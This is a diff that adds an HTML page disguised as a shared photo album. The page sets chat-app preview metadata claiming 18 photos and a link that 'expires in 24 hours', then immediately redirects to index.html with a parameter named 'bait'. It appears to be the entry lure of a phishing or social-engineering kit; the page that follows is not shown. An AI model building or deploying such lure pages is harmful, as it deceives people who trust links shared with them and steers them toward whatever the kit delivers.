@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Shared Album - 18 Photos</title>
+
+  <!-- OpenGraph Preview Metadata (Discord, Messenger, WhatsApp) -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="📸 Shared Photo Album (18 items)" />
+  <meta property="og:description" content="View shared photos and clips. Link expires in 24 hours." />
+  <meta name="theme-color" content="#2b82f6" />
+
+  <!-- Fallback redirect if JavaScript is disabled -->
+  <meta http-equiv="refresh" content="0; url=./index.html?bait=album" />
+</head>
+<body style="background:#0b0d12;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
+  <p>Opening shared album...</p>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    if (!params.has('bait')) params.set('bait', 'album');
+    window.location.replace('./index.html?' + params.toString());
+  </script>
+</body>
+</html>
